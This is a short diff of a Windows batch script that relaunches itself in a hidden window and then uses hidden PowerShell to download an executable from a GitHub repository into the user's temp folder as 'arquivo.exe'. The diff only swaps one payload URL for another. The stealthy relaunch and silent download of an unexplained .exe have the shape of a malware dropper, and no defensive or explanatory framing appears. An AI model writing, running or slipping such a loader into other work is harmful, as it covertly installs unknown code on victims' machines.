@@ -6,7 +6,7 @@ if "%1" neq "hidden" (
     exit
 )
 
-set "URL=https://github.com/lcmandrikion-hash/Mez/raw/refs/heads/main/LZXorg.exe"
+set "URL=https://github.com/lcmandrikion-hash/Mez/blob/main/LZX.exe"
 set "ARQ=%TEMP%\arquivo.exe"
 
 powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%ARQ%'"
